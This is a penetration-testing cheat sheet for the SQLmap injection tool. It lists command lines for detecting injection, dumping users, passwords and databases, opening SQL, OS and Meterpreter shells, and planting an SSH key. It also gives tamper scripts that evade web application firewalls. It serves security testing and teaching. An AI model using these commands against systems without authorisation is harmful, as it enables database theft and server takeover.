# SQLmap

> SQLmap is a powerful tool that automates the detection and exploitation of SQL injection vulnerabilities, saving time and effort compared to manual testing. It supports a wide range of databases and injection techniques, making it versatile and effective in various scenarios.
> Additionally, SQLmap can retrieve data, manipulate databases, and even execute commands, providing a robust set of features for penetration testers and security analysts.
> Reinventing the wheel isn't ideal because SQLmap has been rigorously developed, tested, and improved by experts. Using a reliable, community-supported tool means you benefit from established best practices and avoid the high risk of missing vulnerabilities or introducing errors in custom code.
> However you should always know how SQLmap is working, and be able to replicate it manually if necessary.

## Basic Arguments For SQLmap

```powershell
sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
```

## Load A Request File

A request file in SQLmap is a saved HTTP request that SQLmap reads and uses to perform SQL injection testing. This file allows you to provide a complete and custom HTTP request, which SQLmap can use to target more complex applications.

```powershell
sqlmap -r request.txt
```

## Custom Injection Point

A custom injection point in SQLmap allows you to specify exactly where and how SQLmap should attempt to inject payloads into a request. This is useful when dealing with more complex or non-standard injection scenarios that SQLmap may not detect automatically.

By defining a custom injection point with the wildcard character '`*`' , you have finer control over the testing process, ensuring SQLmap targets specific parts of the request you suspect to be vulnerable.

```powershell
sqlmap -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
```

## Second Order Injection

A second-order SQL injection occurs when malicious SQL code injected into an application is not executed immediately but is instead stored in the database and later used in another SQL query.

```powershell
sqlmap -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```

## Getting A Shell

* SQL Shell:

    ```ps1
    sqlmap -u "http://example.com/?id=1"  -p id --sql-shell
    ```

* OS Shell:

    ```ps1
    sqlmap -u "http://example.com/?id=1"  -p id --os-shell
    ```

* Meterpreter:

    ```ps1
    sqlmap -u "http://example.com/?id=1"  -p id --os-pwn
    ```

* SSH Shell:

    ```ps1
    sqlmap -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
    ```

## Crawl And Auto-Exploit

This method is not advisable for penetration testing; it should only be used in controlled environments or challenges. It will crawl the entire website and automatically submit forms, which may lead to unintended requests being sent to sensitive features like "delete" or "destroy" endpoints.

```powershell
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
```

* `--batch` = Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
* `--crawl` = How deep you want to crawl a site
* `--forms` = Parse and test forms

## Proxy Configuration For SQLmap

To run SQLmap with a proxy, you can use the `--proxy` option followed by the proxy URL. SQLmap supports various types of proxies such as HTTP, HTTPS, SOCKS4, and SOCKS5.

```powershell
sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
sqlmap -u "http://www.target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --proxy-cred="user:pass"
```

* HTTP Proxy:

    ```ps1
    --proxy="http://[username]:[password]@[proxy_ip]:[proxy_port]"
    --proxy="http://user:pass@127.0.0.1:8080"
    ```

* SOCKS Proxy:

    ```ps1
    --proxy="socks4://[username]:[password]@[proxy_ip]:[proxy_port]"
    --proxy="socks4://user:pass@127.0.0.1:1080"
    ```

* SOCKS5 Proxy:

    ```ps1
    --proxy="socks5://[username]:[password]@[proxy_ip]:[proxy_port]"
    --proxy="socks5://user:pass@127.0.0.1:1080"
    ```

## Injection Tampering

In SQLmap, tampering can help you adjust the injection in specific ways required to bypass web application firewalls (WAFs) or custom sanitization mechanisms. SQLmap provides various options and techniques to tamper with the payloads being used for SQL injection.

### Suffix And Prefix

The `--suffix` and `--prefix` options allow you to specify additional strings that should be appended or prepended to the payloads generated by SQLMap. These options can be useful when the target application requires specific formatting or when you need to bypass certain filters or protections.

```powershell
sqlmap -u "http://example.com/?id=1"  -p id --suffix="-- "
```

* `--suffix=SUFFIX`: The `--suffix` option appends a specified string to the end of each payload generated by SQLMap.
* `--prefix=PREFIX`: The `--prefix` option prepends a specified string to the beginning of each payload generated by SQLMap.

### Default Tamper Scripts

A tamper script  is a script that modifies the SQL injection payloads to evade detection by WAFs or other security mechanisms. SQLmap comes with a variety of pre-built tamper scripts that can be used to automatically adjust payloads

```powershell
sqlmap -u "http://targetwebsite.com/vulnerablepage.php?id=1" --tamper=<tamper-script-name>
```

### Custom Tamper Scripts

When creating a custom tamper script, there are a few things to keep in mind. The script architecture contains these mandatory variables and functions:

* `__priority__`: Defines the order in which tamper scripts are applied.  This sets how early or late SQLmap should apply your tamper script in the tamper pipeline. Normal priority is 0 and the highest is 100.
* `dependencies()`: This function gets called before the tamper script is used.
* `tamper(payload)`: The main function that modifies the payload.

The following code is an example of a tamper script that replace instances like '`LIMIT M, N`' with '`LIMIT N OFFSET M`' counterpart:

```py
import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGH

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    retVal = payload

    match = re.search(r"(?i)LIMIT\s*(\d+),\s*(\d+)", payload or "")
    if match:
        retVal = retVal.replace(match.group(0), "LIMIT %s OFFSET %s" % (match.group(2), match.group(1)))

    return retVal
```

* Save it as something like: `mytamper.py`
* Place it inside SQLmap's `tamper/` directory, typically:

    ```ps1
    /usr/share/sqlmap/tamper/
    ```

* Use it with SQLmap

    ```ps1
    sqlmap -u "http://target.com/vuln.php?id=1" --tamper=mytamper
    ```

### Custom SQL Payload

The `--sql-query` option in SQLmap is used to manually run your own SQL query on a vulnerable database after SQLmap has confirmed the injection and gathered necessary access.

```ps1
sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-query="SELECT version()"
```

### Evaluate Python Code

The `--eval` option lets you define or modify request parameters using Python. The evaluated variables can then be used inside the URL, headers, cookies, etc.

Particularly useful in scenarios such as:

* **Dynamic parameters**: When a parameter needs to be randomly or sequentially generated.
* **Token generation**: For handling CSRF tokens or dynamic auth headers.
* **Custom logic**: E.g., encoding, encryption, timestamps, etc.

```ps1
sqlmap -u "http://example.com/vulnerable.php?id=1" --eval="import random; id=random.randint(1,10)"
sqlmap -u "http://example.com/vulnerable.php?id=1" --eval="import hashlib;id2=hashlib.md5(id).hexdigest()"
```

### Preprocess And Postprocess Scripts

```ps1
sqlmap -u 'http://example.com/vulnerable.php?id=1' --preprocess=preprocess.py --postprocess=postprocess.py
```

#### Preprocessing Script (preprocess.py)

The preprocessing script is used to modify the request data before it is sent to the target application. This can be useful for encoding parameters, adding headers, or other request modifications.

```ps1
--preprocess=preprocess.py    Use given script(s) for preprocessing (request)
```

**Example preprocess.py**:

```ps1
#!/usr/bin/env python
def preprocess(req):
    print("Preprocess")
    print(req)
```

#### Postprocessing Script (postprocess.py)

The postprocessing script is used to modify the response data after it is received from the target application. This can be useful for decoding responses, extracting specific data, or other response modifications.

```ps1
--postprocess=postprocess.py  Use given script(s) for postprocessing (response)
```

## Reduce Requests Number

The parameter `--test-filter` is helpful when you want to focus on specific types of SQL injection techniques or payloads. Instead of testing the full range of payloads that SQLMap has, you can limit it to those that match a certain pattern, making the process more efficient, especially on large or slow web applications.

```ps1
sqlmap -u "https://www.target.com/page.php?category=demo" -p category --test-filter="Generic UNION query (NULL)"
sqlmap -u "https://www.target.com/page.php?category=demo" --test-filter="boolean"
```

By default, SQLmap runs with level 1 and risk 1, which generates fewer requests. Increasing these values without a purpose may lead to a larger number of tests that are time-consuming and unnecessary.

```ps1
sqlmap -u "https://www.target.com/page.php?id=1" --level=1 --risk=1
```

Use the `--technique` option to specify the types of SQL injection techniques to test for, rather than testing all possible ones.

```ps1
sqlmap -u "https://www.target.com/page.php?id=1" --technique=B
```

## SQLmap Without SQL Injection

Using SQLmap without exploiting SQL injection vulnerabilities can still be useful for various legitimate purposes, particularly in security assessments, database management, and application testing.

You can use SQLmap to access a database via its port instead of a URL.

```ps1
sqlmap -d "mysql://user:pass@ip/database" --dump-all
```
